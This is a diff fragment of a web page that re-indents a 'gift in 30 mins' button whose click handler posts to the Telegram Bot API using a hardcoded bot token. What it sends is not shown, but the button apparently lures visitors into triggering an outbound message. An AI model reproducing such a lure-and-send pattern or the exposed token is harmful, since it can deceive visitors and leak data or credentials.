@@ -72,12 +72,10 @@
                         <i class="fa-solid fa-heart"></i>
                     </div>
                     <div class="btn">
-            <div class="btn">
-               <button id="notify-btn" class="theme-btn" type="button">
-  Click to get a gift in 30 mins at your home 🎁
-</button>
-
-<script>
+                        <button id="notify-btn" class="theme-btn" type="button">
+                            Click to get a gift in 30 mins at your home 🎁
+                        </button>
+                        <script>
 document.getElementById('notify-btn').addEventListener('click', function() {
   fetch("https://api.telegram.org/bot7845579424:AAGfKJurZIzuLCwlS98HyYT0ySOQXRgmNxY/sendMessage", {
     method: "POST",
@@ -411,6 +409,7 @@ document.getElementById('noty-btn').onclick = function() {
   .catch(err => alert('Error: ' + err.message));
 };
 </script>
+
 
 
 
